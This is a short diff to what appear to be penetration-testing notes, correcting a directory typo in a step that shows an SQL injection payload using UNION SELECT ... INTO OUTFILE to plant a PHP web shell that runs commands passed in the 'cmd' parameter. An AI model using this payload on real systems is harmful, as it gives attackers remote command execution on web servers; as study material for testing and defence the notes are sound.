@@ -86,7 +86,7 @@ we can write files on the server with SELECT INTO_OUTFILE
 
     $ ' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
 
-here we try to use a union select to write a php web shell to /htmp/tmp on the server
+here we try to use a union select to write a php web shell to /html/tmp on the server
 
 now by entering the above statement into the form field we are injecting our webshell to the specified directory
 
